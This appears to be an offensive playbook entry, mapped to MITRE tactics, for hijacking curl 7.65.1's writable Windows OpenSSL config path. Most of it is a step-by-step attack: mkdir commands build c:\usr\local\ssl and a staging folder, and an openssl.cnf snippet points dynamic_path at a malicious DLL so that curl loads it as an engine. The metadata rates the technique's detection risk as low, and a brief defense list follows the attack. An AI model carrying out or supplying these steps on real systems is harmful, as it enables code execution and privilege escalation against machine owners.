---
id: proc-openssl-path-setup-001
tags:
  - directory-creation
  - config-manipulation
  - openssl
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/mkdir-create-c-usr]]'
  - '[[commands/mkdir-create-c-usr-local]]'
  - '[[commands/mkdir-create-c-usr-local-ssl]]'
  - '[[commands/mkdir-create-c-stage]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[DLL Side-Loading]]'
updated_at: '2025-12-14T17:29:44.249Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[DLL Side-Loading]]'
---
# Setup OpenSSL Configuration Path

## Summary

This procedure sets up the directory structure under C:\ to match curl's insecure OPENSSLDIR ('c:\usr\local\ssl') and creates a malicious openssl.cnf file to load a custom OpenSSL Engine DLL, preparing for DLL injection in a low-privileged context on Windows.

## Description

In curl's Windows build, the OPENSSLDIR is set to 'c:\usr\local\ssl', a path writable by low-privileged users since they can create folders on the C: root. This procedure creates the necessary directories and a config file that specifies a dynamic_path to a malicious DLL (e.g., c:\stage\calc.dll). When curl loads OpenSSL, it reads this config and loads the DLL, executing arbitrary code. Prerequisites include local low-priv access; no elevated rights needed here, but the impact escalates later.

## Requirements

1. Low-privileged Windows user account with write access to C:\
2. Text editor to create openssl.cnf (e.g., notepad)
3. Target: Windows 10 with vulnerable curl 7.65.1

## Defense

Defensive measures and detection strategies:

- Rebuild curl with secure OPENSSLDIR (e.g., under Program Files)
- Monitor directory creation under C:\usr\local\ssl via file system auditing
- Use AppLocker or WDAC to restrict DLL loading in curl processes

## Objectives

1. Establish writable path for OpenSSL config hijacking
2. Configure malicious Engine loading for subsequent DLL injection
3. Prepare environment for privilege escalation trigger

## Instructions

### Step 1: Create Root Directory Structure

**Context**: Build the path c:\usr\local\ssl to match OPENSSLDIR, allowing config placement.

**Command** ([[commands/mkdir-create-c-usr]]):
```cmd
mkdir c:\usr
```

> Creates the usr directory; expected output: "Directory created successfully" or no error.

**Command** ([[commands/mkdir-create-c-usr-local]]):
```cmd
mkdir c:\usr\local
```

> Creates local subdir; confirms path build.

**Command** ([[commands/mkdir-create-c-usr-local-ssl]]):
```cmd
mkdir c:\usr\local\ssl
```

> Finalizes ssl dir for config file.

### Step 2: Create Staging Directory and Malicious Config

**Context**: Prepare DLL location and config to reference it.

**Command** ([[commands/mkdir-create-c-stage]]):
```cmd
mkdir c:\stage
```

> Staging for DLL; expected: Directory created.

Manually create openssl.cnf in c:\usr\local\ssl\ with content like:

```ini
[engine_section]
dynamic_path = c:\stage\calc.dll
```

> This directs OpenSSL to load the DLL as an Engine.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[DLL Side-Loading]] DLL Side-Loading

### Sub-Techniques


## Commands Used

- [[commands/mkdir-create-c-usr]]
- [[commands/mkdir-create-c-usr-local]]
- [[commands/mkdir-create-c-usr-local-ssl]]
- [[commands/mkdir-create-c-stage]]

## Tools Used


## Tags

- directory-creation
- config-hijacking
